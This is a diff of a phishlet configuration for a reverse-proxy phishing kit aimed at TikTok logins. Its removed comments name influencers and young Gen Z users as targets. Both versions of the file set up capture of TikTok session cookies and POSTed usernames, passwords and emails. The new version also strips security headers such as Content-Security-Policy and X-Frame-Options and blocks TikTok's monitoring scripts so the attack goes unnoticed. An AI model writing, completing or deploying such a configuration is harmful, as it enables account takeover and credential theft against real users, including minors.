@@ -1,28 +1,27 @@
-# PHISHLET FINAL : TIKTOK (VANTABLACK VIRAL)
-# CIBLE : INFLUENCEURS & JEUNESSE (GEN Z)
-# ATTENTION : PROTECTION ANTIBOT TRES ELEVEE SUR TIKTOK
-min_ver: '3.0.0'
+name: "TikTok-Login"
+author: "Vanta v5"
+min_ver: "5.0.0"
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'tiktok.com', session: true, is_landing: true}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'tiktok.com', session: true, is_landing: false}
-
-sub_filters:
-  - {triggers_on: 'www.tiktok.com', orig_sub: 'www', domain: 'tiktok.com', search: 'https://www.tiktok.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript', 'application/json']}
-
+  - subdomain: "tiktok"
+    target: "www.tiktok.com"
+auth_urls: ["/login"]
+landing_path: ["/login"]
 auth_tokens:
-  - domain: '.tiktok.com'
-    keys: ['session_id', 'tt_webid', 'tt_webid_v2', 'csrf_session_id']
-
+  - {type: "cookie", name: "sessionid"}
+  - {type: "cookie", name: "tt_webid"}
+  - {type: "cookie", name: "csrf_session_id"}
 credentials:
-  username:
-    key: 'username'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'password'
-    search: '(.*)'
-    type: 'post'
-
-login:
-  domain: 'www.tiktok.com'
-  path: '/login'
+  - {type: "post_param", name: "username", regex: null}
+  - {type: "post_param", name: "password", regex: null}
+  - {type: "post_param", name: "email", regex: null}
+injections: []
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/login", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|/slardar/|/mon/|/log", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*=\"login\"]", action_to: "/api/login"}
